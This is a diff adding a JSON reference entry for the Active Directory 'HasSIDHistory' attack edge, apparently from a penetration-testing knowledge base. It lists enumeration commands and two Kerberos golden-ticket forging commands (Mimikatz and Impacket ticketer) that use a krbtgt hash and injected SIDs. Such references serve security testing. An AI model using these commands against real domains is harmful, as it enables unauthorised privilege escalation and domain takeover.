@@ -1,0 +1,67 @@
+{
+    "HasSIDHistory": {
+        "meaning": "The given source principal has, in its SIDHistory attribute, the SID for the target principal. When a Kerberos ticket is created for source principal, it will include the SID for the target principal, and therefore grant the source principal the same privileges and permissions as the target principal.",
+        "common": "",
+        "windows": {
+            "PowerView": [
+                {
+                    "order": 1,
+                    "command": "Get-DomainUser -Identity sourceuser -Properties sidhistory",
+                    "description": "Check SID history attribute of source user"
+                },
+                {
+                    "order": 2,
+                    "command": "# SID history is automatically included in Kerberos tickets",
+                    "description": "No additional action needed - automatic privilege inheritance"
+                }
+            ],
+            "ADModule": [
+                {
+                    "order": 1,
+                    "command": "Get-ADUser -Identity sourceuser -Properties SIDHistory",
+                    "description": "View SID history using Active Directory module"
+                }
+            ],
+            "Mimikatz": [
+                {
+                    "order": 1,
+                    "command": "mimikatz # sekurlsa::tickets",
+                    "description": "View current Kerberos tickets to see included SIDs"
+                },
+                {
+                    "order": 2,
+                    "command": "mimikatz # kerberos::golden /user:sourceuser /domain:domain.com /sid:S-1-5-21-domain-sid /krbtgt:hash /sids:target-sid /ptt",
+                    "description": "Create golden ticket with SID history (if needed)"
+                }
+            ]
+        },
+        "linux": {
+            "BloodyAD": [
+                {
+                    "order": 1,
+                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get object 'CN=sourceuser,CN=Users,DC=domain,DC=com' --attr sIDHistory",
+                    "description": "Check SID history attribute using bloodyAD"
+                }
+            ],
+            "Impacket": [
+                {
+                    "order": 1,
+                    "command": "python3 GetADUsers.py -all DOMAIN/USER:PASSWORD@DC_IP -outputfile users.txt",
+                    "description": "Enumerate users and check for SID history"
+                },
+                {
+                    "order": 2,
+                    "command": "python3 ticketer.py -nthash krbtgt_hash -domain domain.com -sid domain_sid -extra-sid target_sid sourceuser",
+                    "description": "Create ticket with SID history using Impacket ticketer"
+                }
+            ],
+            "LDAP": [
+                {
+                    "order": 1,
+                    "command": "ldapsearch -H ldap://dc.domain.com -D 'CN=user,CN=Users,DC=domain,DC=com' -w password -b 'CN=Users,DC=domain,DC=com' '(&(objectClass=user)(sIDHistory=*))' sIDHistory",
+                    "description": "Search for users with SID history using LDAP"
+                }
+            ]
+        }
+    }
+}
